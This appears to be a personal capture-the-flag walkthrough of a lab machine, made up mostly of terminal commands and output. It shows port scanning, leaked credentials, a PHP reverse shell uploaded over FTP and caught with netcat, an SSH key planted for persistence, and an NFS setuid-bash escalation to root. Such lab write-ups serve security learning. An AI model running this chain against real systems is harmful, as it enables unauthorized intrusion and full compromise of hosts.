```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sCV -A --script=vuln -T5 10.10.50.135
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 09:50 EDT
Nmap scan report for 10.10.50.135
Host is up (0.14s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:8.0: 
|     	EDB-ID:21018	10.0	https://vulners.com/exploitdb/EDB-ID:21018	*EXPLOIT*
|     	CVE-2001-0554	10.0	https://vulners.com/cve/CVE-2001-0554
|     	CVE-2020-15778	6.8	https://vulners.com/cve/CVE-2020-15778
|     	CVE-2010-4816	5.0	https://vulners.com/cve/CVE-2010-4816
|     	CVE-2019-16905	4.4	https://vulners.com/cve/CVE-2019-16905
|     	MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/	*EXPLOIT*
|     	MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	4.3	https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/	*EXPLOIT*
|     	CVE-2020-14145	4.3	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2007-2768	4.3	https://vulners.com/cve/CVE-2007-2768
|     	MSF:EXPLOIT/FREEBSD/WEBAPP/SPAMTITAN_UNAUTH_RCE/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/FREEBSD/WEBAPP/SPAMTITAN_UNAUTH_RCE/	*EXPLOIT*
|_    	MSF:EXPLOIT/FREEBSD/MISC/CITRIX_NETSCALER_SOAP_BOF/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/FREEBSD/MISC/CITRIX_NETSCALER_SOAP_BOF/	*EXPLOIT*
80/tcp open  http    Apache httpd 2.4.37 ((centos))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.37 (centos)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
| vulners: 
|   cpe:/a:apache:http_server:2.4.37: 
|     	MSF:ILITIES/UBUNTU-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2020-11984/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2020-11984/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-11984/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11984/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-11984/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11984/	7.5	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11984/	*EXPLOIT*
|     	CVE-2021-26691	7.5	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2020-11984	7.5	https://vulners.com/cve/CVE-2020-11984
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	7.2	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/	*EXPLOIT*
|     	EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	7.2	https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB	*EXPLOIT*
|     	CVE-2019-0211	7.2	https://vulners.com/cve/CVE-2019-0211
|     	1337DAY-ID-32502	7.2	https://vulners.com/zdt/1337DAY-ID-32502	*EXPLOIT*
|     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
|     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0215/	6.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0215/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
|     	CVE-2019-10097	6.0	https://vulners.com/cve/CVE-2019-10097
|     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
|     	CVE-2019-0215	6.0	https://vulners.com/cve/CVE-2019-0215
|     	EDB-ID:47689	5.8	https://vulners.com/exploitdb/EDB-ID:47689	*EXPLOIT*
|     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
|     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
|     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/FREEBSD-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-9490/	5.0	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-9490/	*EXPLOIT*
|     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-9490	5.0	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
|     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
|     	CVE-2019-10081	5.0	https://vulners.com/cve/CVE-2019-10081
|     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
|     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
|     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
|     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
|     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2020-11993/	4.3	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2020-11993/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11993/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11993/	*EXPLOIT*
|     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2020-11993/	4.3	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2020-11993/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11993/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11993/	*EXPLOIT*
|     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
|     	MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-11993/	4.3	https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-11993/	*EXPLOIT*
|     	EDB-ID:47688	4.3	https://vulners.com/exploitdb/EDB-ID:47688	*EXPLOIT*
|     	CVE-2020-11993	4.3	https://vulners.com/cve/CVE-2020-11993
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	CVE-2020-13938	2.1	https://vulners.com/cve/CVE-2020-13938
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|     	EDB-ID:46676	0.0	https://vulners.com/exploitdb/EDB-ID:46676	*EXPLOIT*
|     	1337DAY-ID-663	0.0	https://vulners.com/zdt/1337DAY-ID-663	*EXPLOIT*
|     	1337DAY-ID-601	0.0	https://vulners.com/zdt/1337DAY-ID-601	*EXPLOIT*
|     	1337DAY-ID-4533	0.0	https://vulners.com/zdt/1337DAY-ID-4533	*EXPLOIT*
|     	1337DAY-ID-3109	0.0	https://vulners.com/zdt/1337DAY-ID-3109	*EXPLOIT*
|_    	1337DAY-ID-2237	0.0	https://vulners.com/zdt/1337DAY-ID-2237	*EXPLOIT*
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.48 seconds






┌──(kali㉿kali)-[~]
└─$ dirsearch -r -u 10.10.50.135  

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 10877

Output File: /home/kali/.dirsearch/reports/10.10.50.135/_21-06-27_09-50-57.txt

Error Log: /home/kali/.dirsearch/logs/errors-21-06-27_09-50-57.log

Target: http://10.10.50.135/

[09:50:57] Starting: 
[09:51:01] 403 -  220B  - /.ht_wsr.txt
[09:51:01] 403 -  223B  - /.htaccess.bak1
[09:51:01] 403 -  223B  - /.htaccess.orig
[09:51:01] 403 -  223B  - /.htaccess.save
[09:51:01] 403 -  225B  - /.htaccess.sample
[09:51:01] 403 -  223B  - /.htaccess_orig
[09:51:01] 403 -  224B  - /.htaccess_extra
[09:51:01] 403 -  222B  - /.htaccessOLD2
[09:51:01] 403 -  221B  - /.htaccess_sc
[09:51:01] 403 -  221B  - /.htaccessOLD
[09:51:01] 403 -  221B  - /.htaccessBAK
[09:51:01] 403 -  214B  - /.html
[09:51:01] 403 -  213B  - /.htm
[09:51:01] 403 -  223B  - /.htpasswd_test
[09:51:01] 403 -  220B  - /.httr-oauth
[09:51:01] 403 -  219B  - /.htpasswds
[09:51:04] 403 -  218B  - /.user.ini
[09:51:21] 301 -  236B  - /backups  ->  http://10.10.50.135/backups/
[09:51:22] 200 -  894B  - /backups/     (Added to queue)
[09:51:23] 403 -  217B  - /cgi-bin/     (Added to queue)
[09:51:33] 200 -    2KB - /index.html
[09:51:54] Starting: backups/
[09:51:59] 403 -  228B  - /backups/.ht_wsr.txt
[09:51:59] 403 -  231B  - /backups/.htaccess.bak1
[09:51:59] 403 -  231B  - /backups/.htaccess.orig
[09:51:59] 403 -  231B  - /backups/.htaccess_orig
[09:51:59] 403 -  232B  - /backups/.htaccess_extra
[09:51:59] 403 -  229B  - /backups/.htaccessOLD
[09:51:59] 403 -  233B  - /backups/.htaccess.sample
[09:51:59] 403 -  229B  - /backups/.htaccessBAK
[09:51:59] 403 -  231B  - /backups/.htaccess.save
[09:51:59] 403 -  222B  - /backups/.html
[09:51:59] 403 -  221B  - /backups/.htm
[09:51:59] 403 -  230B  - /backups/.htaccessOLD2
[09:51:59] 403 -  231B  - /backups/.htpasswd_test
[09:51:59] 403 -  229B  - /backups/.htaccess_sc
[09:51:59] 403 -  228B  - /backups/.httr-oauth
[09:51:59] 403 -  227B  - /backups/.htpasswds
[09:52:02] 403 -  226B  - /backups/.user.ini
[09:52:20] 200 -   13KB - /backups/backup.zip
[09:52:50] Starting: cgi-bin/
[09:52:54] 403 -  228B  - /cgi-bin/.ht_wsr.txt
[09:52:54] 403 -  231B  - /cgi-bin/.htaccess.bak1
[09:52:54] 403 -  231B  - /cgi-bin/.htaccess.orig
[09:52:54] 403 -  233B  - /cgi-bin/.htaccess.sample
[09:52:54] 403 -  229B  - /cgi-bin/.htaccessBAK
[09:52:54] 403 -  231B  - /cgi-bin/.htaccess_orig
[09:52:54] 403 -  229B  - /cgi-bin/.htaccess_sc
[09:52:54] 403 -  232B  - /cgi-bin/.htaccess_extra
[09:52:54] 403 -  221B  - /cgi-bin/.htm
[09:52:54] 403 -  222B  - /cgi-bin/.html
[09:52:54] 403 -  228B  - /cgi-bin/.httr-oauth
[09:52:54] 403 -  231B  - /cgi-bin/.htpasswd_test
[09:52:54] 403 -  231B  - /cgi-bin/.htaccess.save
[09:52:54] 403 -  227B  - /cgi-bin/.htpasswds
[09:52:54] 403 -  229B  - /cgi-bin/.htaccessOLD
[09:52:54] 403 -  230B  - /cgi-bin/.htaccessOLD2
[09:52:58] 403 -  226B  - /cgi-bin/.user.ini

Task Completed
```  
   
   
backup.zip

unzip , we get two files, 

CustomerDetails.xlsx.gpg

priv.key


went to writeup,

so we needed to 

gpg --import priv.key
gpg CustomerDetails.xlsx.gpg

but since it's excell, needed to do that in windows to actually see the file, I'm good, can see the content on writeup, 

hydra is taking foooooooooooorrrrrrrrrrrrrrrrreeeeeeeeeeeeeeeeeeevvvvvvvvvvvvvvvvvvveeeeeeeeeeeeeeeeeeeeerrrrrrrrrrrrrrrrrrrrrr


so apparantely the file contained the passwords, so downloading libreoffice so I can see the spreadsheat as pdf ,,,

libreoffice instal is taking foooooooorrrrrrrrreeeeeeeeeeeeeevvvvvvvvvvveeeeeeeeeeeeerrrrrrrrrrr guess this is the forever day,

f***u*** it, might as well update shit, and take a break,,, lol

Par. A. Doxx	paradox	ShibesAreGreat123
0day Montgomery	0day	OllieIsTheBestDog
Muir Land	muirlandoracle	A11D0gsAreAw3s0me

we go in ftp, we can upload files, so we upload php shell and execute it on web, or curl 

```bash                                                                              
┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ ftp 10.10.50.135
Connected to 10.10.50.135.
220 (vsFTPd 3.0.3)
Name (10.10.50.135:kali): paradox
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put reverse.php
local: reverse.php remote: reverse.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.


                                                                                   
┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ nc -lnvp 1234                              
listening on [any] 1234 ...
connect to [10.6.65.43] from (UNKNOWN) [10.10.50.135] 50474
Linux ip-10-10-50-135 4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:19:43 up  1:32,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (868): Inappropriate ioctl for device
sh: no job control in this shell


su paradox


┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ sudo ssh-keygen -f paradox                                                 1 ⨯
[sudo] password for kali: 
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in paradox
Your public key has been saved in paradox.pub
The key fingerprint is:
SHA256:rOcXVfdlj0tkYjObkz0xG6f8ZkUe1yNMdeTnwjUsq7U root@kali
The key's randomart image is:
+---[RSA 3072]----+
|            o..o+|
|            =oO+X|
|           . #./@|
|       .    *.@oB|
|        S  . =o+o|
|       .  . o o.+|
|      . .  o E o |
|       o  .      |
|        ..       |
+----[SHA256]-----+
 
 
 
change directory , make ssh public key,, 

cd paradox
ls
CustomerDetails.xlsx
CustomerDetails.xlsx.gpg
backup.zip
priv.key
ls -lah
total 56K
drwx------. 4 paradox paradox  203 Nov 18  2020 .
drwxr-xr-x. 4 root    root      34 Nov  8  2020 ..
lrwxrwxrwx. 1 paradox paradox    9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 paradox paradox   18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 paradox paradox  141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 paradox paradox  312 Nov  8  2019 .bashrc
drwx------. 4 paradox paradox  132 Nov  8  2020 .gnupg
drwx------  2 paradox paradox   47 Nov 18  2020 .ssh
-rw-rw-r--. 1 paradox paradox 9.8K Nov  8  2020 CustomerDetails.xlsx
-rw-rw-r--. 1 paradox paradox  11K Nov  8  2020 CustomerDetails.xlsx.gpg
-rw-rw-r--. 1 paradox paradox  14K Nov  8  2020 backup.zip
-rw-------. 1 paradox paradox 3.5K Nov  8  2020 priv.key
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDt1Zh6KMT+FtGv3M2/iCZxBB/xhUnmCe28mWKf227WScN1a1882oulQwxenSufL1OHokZbqOsmVhT4+VTK7grPirOJUp1WhASdT2mMMbbEq3kf3KylAbkVG9QkvLC8T5mYxAeEFWz0gAveOuJBp26K6JQK6IyhWv7B5Whre4DwVBOwKxTHgl1OrE30gUoRXmJutNguwLiDIRATFi6wtkbHDh5lIorxDthPyuY6k8dZvR51Eeq4aCzIUxkaiBcHcROvrqv7BHHN00tk/McAnK1Myp2fUoUV/fv+CsmPLOWCt8672KEaqG7dSqw/I/k9U0C+MVrORrJB6YS6dDcRmTSzTnJuYHdIzdtOSjsiEcIMH3pZolc/fBxCODKSGvHsy7oMQEqydsUFGTS9nrZ2vCfhGJPgfoN/GSvSA7jxTPBUBGj2I7j/3lkvT1D909eFTiwTgKRpXYP7QT3TxEYusQY4FEe95VOeRCO4fGqFaVJqvEx4hYvCXEDNbKPVP2onlpU= root@kali' > .ssh/authorized_keys
```

                        
                        
we ssh in, 

```bash                                                      
┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ sudo chmod 600 paradox                                                     1 ⨯
                                                                                   
┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ ssh paradox@10.10.50.135 -i paradox
Load key "paradox": Permission denied
paradox@10.10.50.135: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
                                                                                   
┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ sudo ssh paradox@10.10.50.135 -i paradox                                 255 ⨯
The authenticity of host '10.10.50.135 (10.10.50.135)' can't be established.
ECDSA key fingerprint is SHA256:Zc/Zqa7e8cZI2SP2BSwt5iLz5wD3XTxIz2SLZMjoJmE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.50.135' (ECDSA) to the list of known hosts.
Enter passphrase for key 'paradox': 
Last login: Sun Jun 27 16:24:11 2021
[paradox@ip-10-10-50-135 ~]$ 
```
the tunnels,,,, whooooooooooooaaaaaaaa, 


run linpeas,,,


so tried to load linpeas on ssh, not sure put, wget, wouldn't work probably because they are ftp services maybe, not sure, but I know we can put in ftp , so let's just open an ftp and serve linpeas, as anyway i want to try the chisel way, for the tunnel, 


awesome got linpeas to work, loaded binary with put on ftp, had a bit of an issue getting it to execute, bash linpeas.sh did the trick, made sure it was executable,
chmod +x linpeas.sh , and re downloaded it, and yeay, got it to run, 



so yea,  you need to be in root directory for the tunnel, 

opened doble ssh 
```bash
┌──(kali㉿kali)-[/hackme/scripts/101]
└─$ sudo ssh paradox@10.10.6.49 -i paradox -L 2049:localhost:2049
Enter passphrase for key 'paradox': 
Last login: Sun Jun 27 18:13:46 2021 from 10.6.65.43
[paradox@ip-10-10-6-49 ~]$ ls
backup.zip  CustomerDetails.xlsx  CustomerDetails.xlsx.gpg  priv.key
[
```
create mnt directory (which I already have apparently from previous mounts, 

```bash
┌──(kali㉿kali)-[/]
└─$ sudo mount -t nfs4 localhost:/ mnt                                         1 ⨯
                                                                                   
┌──(kali㉿kali)-[/]
└─$ cd mnt         
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ ls
user.flag
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ cat user.flag    
thm{3693fc86661faa21f16ac9508a43e1ae}
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ 
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ cp /bin/bash .                                                           130 ⨯
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ sudo chown root:root ./bash
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ sudo chmod +s ./bash
                                                                                   
┌──(kali㉿kali)-[/mnt]
└─$ sudo chmod +rx .
```  
  
  
now on the ssh as paradox


```bash
[paradox@ip-10-10-6-49 james]$ /home/james/bash -p
/home/james/bash: /lib64/libtinfo.so.6: no version information available (required by /home/james/bash)
bash-5.1# whoami
root
bash-5.1# cd /root
bash-5.1# ls
root.flag
bash-5.1# cat root.flag
thm{a4f6adb70371a4bceb32988417456c44}
bash-5.1# 
```



